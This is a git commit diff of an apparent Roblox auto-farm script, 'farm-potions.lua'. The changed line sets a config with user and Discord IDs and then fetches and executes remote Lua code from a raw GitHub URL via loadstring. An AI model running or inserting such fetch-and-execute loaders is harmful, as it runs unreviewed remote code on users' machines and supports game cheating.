e9d44f8bb7ea6f783004998ce5fac31c5a446c3a
FastzinScripter <fastzin.adm@gmail.com>
2025-08-26 00:00:30 -0300

    Update farm-potions.lua

--- farm-potions.lua
+++ farm-potions.lua
@@ -13,5 +13,5 @@ task.spawn(function()
 end)
 
 task.spawn(function() 
-  _G.Config = { UserID = "081cfa79-2618-42ec-ab9a-7ec1d42ab32a", discord_id = "904871270397648947" , Note = "Pc", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/adoptmee"))()
+  _G.Config = { UserID = "081cfa79-2618-42ec-ab9a-7ec1d42ab32a", discord_id = "904871270397648947" , Note = _G.TrackNote, } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/adoptmee"))()
 end)
